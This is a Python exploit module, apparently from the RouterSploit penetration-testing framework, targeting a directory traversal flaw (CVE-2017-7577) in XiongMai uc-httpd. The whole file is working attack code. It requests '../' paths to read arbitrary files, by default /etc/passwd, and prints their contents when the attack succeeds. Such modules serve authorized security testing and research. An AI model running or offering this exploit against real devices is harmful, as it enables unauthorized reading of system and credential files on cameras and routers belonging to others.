import re

from routersploit import (
    exploits,
    print_error,
    print_info,
    print_success,
    http_request,
    mute,
    validators
)


class Exploit(exploits.Exploit):
    """
    XiongMai uc-httpd has directory traversal allowing the reading of arbitrary files via a "GET ../" HTTP request.
    """
    __info__ = {
        'name': 'uc-httpd Directory Traversal',
        'description': 'XiongMai uc-httpd has directory traversal allowing the reading of arbitrary files via a "GET ../" HTTP request.',
        'authors': [
            'keksec',  # vulnerability discovery
            'GH0st3rs',  # routersploit module
        ],
        'references': [
            'https://packetstormsecurity.com/files/142131/uc-httpd-directory-traversal.txt',
            'https://www.cvedetails.com/cve/CVE-2017-7577/'
        ],
        'devices': [
            'Xiongmai Technologies app: Uc-httpd 1.0.0',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port', validators=validators.integer)  # default port
    filename = exploits.Option('/etc/passwd', 'Target file path')

    def __init__(self):
        self.content = None

    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")
            print_info(self.content)
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        url = "{}:{}/../../../../..{}".format(self.target, self.port, self.filename)
        response = http_request(method="GET", url=url)
        if response and re.match("(root|[aA]dmin):.*?:.*?:.*?:.*?:.*?:", response.text):
            self.content = response.text
            return True  # target is vulnerable
        return False  # target is not vulnerable
